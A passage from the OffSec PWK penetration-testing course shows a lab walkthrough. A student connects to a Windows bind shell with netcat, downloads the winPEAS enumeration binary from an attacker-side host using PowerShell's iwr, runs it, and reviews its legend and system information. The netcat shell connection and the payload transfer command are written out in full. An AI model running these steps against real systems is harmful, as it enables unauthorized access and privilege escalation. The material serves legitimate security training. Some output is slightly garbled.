# OffSec

Let's connect to the bind running on port 4444 by CLIENTWK220 as user dave as we before. Start PowerShell and use the iwr783 Cmdlet with the URL of the winPEAS binary argument for -Uri and winPeas -Outfile

```
kali@kali:~$ nc 192.168.50.220 4444
Microsoft Windows [Version 10.0.22000.318]
(C) Microsoft Corporation. All rights reserved.

C:\Users\dave> powershell\powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements!
https://aka.ms/PS5Windows
```

```
PS C:\Users\dave> iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
```

Listing 405 - Connect to the bind shell and transfer the WinPEAS binary to CLIENTWK220

Now, let's run the winPEAS program. It will take a few minutes for the program to finish. While it is running, review the output legend of winPEAS. It categorizes results in different colors identifying items that deeper inspection (red) and important information about protections (green).

```
C:\Users\dave> .winPEAS.exe
```

+   +] Legend:
Red Indicates a special privilege over an object or something
misconfigured Indicates that some protection is enabled or something is
Green
well configured Indicates active users
Cyan Indicates disabled users
Blue
LightYellow Indicates links

Listing 406 - Output legend of winPEAS

After the program is finished, let's review some of its findings. We begin with the basic system information.

```
...
### Basic System Information
...
```

```
Hostname: clientwk220
ProductName: Windows 10 Pro
EditionID: Professional
ReleaseId: 2009
BuildBranch: co-release
CurrentMajorVersionNumber: 10
CurrentVersion: 6.3
Architecture: AMD64
ProcessorCount: 2
```

783 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?powershell=7.2

PWK - Copyright © 2023 OffSec Services Limited. All rights reserved.